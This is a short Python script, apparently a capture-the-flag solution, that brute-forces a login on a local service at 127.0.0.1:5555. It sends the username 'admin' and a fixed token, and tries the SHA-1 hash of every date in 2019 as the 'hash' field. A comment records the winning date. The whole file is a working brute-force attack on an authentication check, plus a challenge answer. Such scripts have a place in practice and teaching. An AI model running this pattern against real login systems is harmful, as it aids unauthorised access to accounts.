import hashlib
import requests

url="http://127.0.0.1:5555"

#XX/XX/2019
for i in range(1,13):
    for j in range(1,32):
        month=str(i).zfill(2)
        day=str(j).zfill(2)
        date=f"{day}/{month}/2019"
        hash=hashlib.sha1(date.encode()).hexdigest() 
        data3={"action": "login", "username": "admin", "token": "Y3liZXI=", "hash": hash}
        response=requests.post(url=url,json=data3)
        if(response.text!="Good password, wrong hash"):
            print(response.text)
            print(date) #11/11/2019
            break

